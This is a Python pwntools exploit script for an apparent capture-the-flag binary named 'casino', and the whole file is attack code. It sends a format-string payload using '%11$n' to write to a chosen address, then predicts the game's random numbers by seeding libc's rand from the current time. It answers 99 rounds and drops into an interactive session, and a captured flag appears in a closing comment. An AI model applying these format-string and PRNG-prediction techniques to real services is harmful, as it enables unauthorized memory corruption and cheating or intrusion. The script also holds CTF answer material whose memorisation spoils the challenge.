#!/usr/bin/env python
from pwn import *
import sys, ctypes

context.terminal = ['tmux', 'split-window', '-h']
elf = ELF('./casino', checksec=False)

libc = ctypes.CDLL('/usr/lib64/libc.so.6')
seed = libc.time(0) / 10

if sys.argv.__len__() == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = elf.process(aslr=False)
    gdb.attach(r, 'brva 0xac3')

payload  = '___%11$n{}'.format(p64(0x602020))
r.sendafter('? ', payload)

libc.srand(seed + 3)

for i in range(99):
    ans = str(libc.rand())
    print r.recv()
    r.sendline(ans)
r.interactive()

# F#{buggy_c4s1n0_1s_n0t_f41r!}
